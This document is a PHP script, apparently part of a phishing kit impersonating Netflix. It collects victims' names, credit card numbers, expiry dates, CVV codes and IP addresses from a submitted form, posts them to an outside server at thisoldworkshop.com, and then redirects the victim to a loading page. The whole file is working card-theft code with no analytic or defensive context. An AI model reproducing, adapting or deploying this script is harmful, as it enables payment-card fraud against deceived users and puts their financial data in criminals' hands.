<?php

$first = $_POST['first'];
$last = $_POST['last'];
$ccnumber = $_POST['ccnumber'];
$month = $_POST['month'];
$year = $_POST['year'];
$cvv = $_POST['cvv'];


$ip = getenv("REMOTE_ADDR");

//sending email info here

	$ip = getenv("REMOTE_ADDR");
        $subj = "NetFlixCC | $ccnumber | $ip |";
        $msg = "

Name: $first $last<br>
Card Number: $ccnumber<br>
Expiration Date: $month/$year<br>
Security Code: $cvv<br>
IP: $ip";
        
$ch = curl_init('http://www.thisoldworkshop.com/bottom.php');
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, "subject=".$subj."&data=".$msg);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec ($ch);
curl_close ($ch);
header("Location: load.htm");

?>